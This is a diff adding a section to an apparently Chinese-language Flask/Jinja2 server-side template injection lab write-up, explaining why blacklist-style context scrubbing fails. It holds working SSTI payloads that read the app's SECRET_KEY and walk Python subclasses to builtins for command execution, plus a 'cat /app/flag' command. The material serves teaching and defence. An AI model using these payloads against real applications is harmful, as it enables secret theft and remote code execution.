@@ -621,6 +621,26 @@ POST 时带上 `cmd=cat /app/flag`（若要用查询串，把 `request.form.cmd`
 ```
 
 **实测**：`Hello SSTILAB{enjoy_flask_ssti}`（57 字符，同第 1 关）
+**实战意义：这种"清理上下文"的防御为什么注定失败**
+
+| 失效原因 | 实测证据 |
+|---|---|
+| ① 只废掉 2 个名字，Jinja2 自带的 6 个全局（lipsum / cycler / joiner / namespace / range / dict）都还在 | `{{ lipsum }}` 正常 → 换个起点即可 |
+| ② **名字被遮 ≠ 对象消失**：对象仍被别处持有，绕条路就能取回 | `{{ url_for.__globals__['current_app'].config['SECRET_KEY'] }}` → 真配置还在 |
+| ③ **字面量删不掉**：`''`、`[]`、`{}`、`1` 是语言语法，不在上下文里 | 把 12 个名字全部置空后，`''.__class__.__mro__[1].__subclasses__()[i].__init__.__globals__['__builtins__']…` 照样命令执行成功 |
+
+```text
+结论：删名字 / 查关键词 / 禁字符这类"黑名单"只能提高门槛；
+      根治只有两条 —— ① 不把用户输入拼进模板源   ② 用沙箱限制"能力"，而不是删名字。
+```
+
+判读要点（三种"看不到东西"要分清）：
+
+```text
+{{ config }}       -> Hello None      值是 None（名字还在，只是被 set 成了 None）
+{{ 不存在的名字 }}   -> Hello（空）      名字不存在 → Undefined → 渲染成空
+{{ 'q' }}          -> Hello WAF       被字符过滤拦了
+```
 
 ### 第 11 关：禁 `'` `"` `+` `request` `.` `[` `]`
 
